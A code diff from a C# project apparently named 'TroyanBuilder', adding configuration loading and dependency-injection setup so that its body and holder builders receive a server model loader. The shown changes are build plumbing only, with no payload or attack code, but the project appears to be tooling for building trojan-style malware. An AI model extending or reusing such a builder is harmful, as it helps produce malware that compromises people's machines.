@@ -1,4 +1,8 @@
-﻿using model;
+using Commons;
+using Microsoft.Extensions.Configuration;
+using Microsoft.Extensions.DependencyInjection;
+using Microsoft.Extensions.Options;
+using model;
 
 namespace TroyanBuilder;
 
@@ -40,11 +44,27 @@ public class Program
         Console.WriteLine("Starting Troyan Builder: server:" + server + " packId:" + packId);
 
         Clean();
+        var config = new ConfigurationBuilder()
+            .SetBasePath(AppContext.BaseDirectory)
+            .AddJsonFile("appsettings.json", optional: false)
+            .Build();
+
+        var services = new ServiceCollection();
+        services.AddSingleton<IValidateOptions<DomainHostOptions>, DomainHostOptionsValidator>();
+        services.AddOptions<DomainHostOptions>()
+            .Bind(config.GetRequiredSection(DomainHostOptions.SectionName))
+            .ValidateOnStart();
+        services.AddSingleton<IHephaestusPathResolver, HephaestusPathResolver>();
+        services.AddPanelServerStack();
+
+        using var provider = services.BuildServiceProvider();
+        var loader = provider.GetRequiredService<ServerModelLoader>();
+
         var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
         foreach (var cb in arr)
         {
             Console.WriteLine(cb);
-            var result = cb.Build(server, packId);
+            var result = cb.Build(server, packId, loader);
             foreach (var line in result)
             {
                 Console.WriteLine(line);
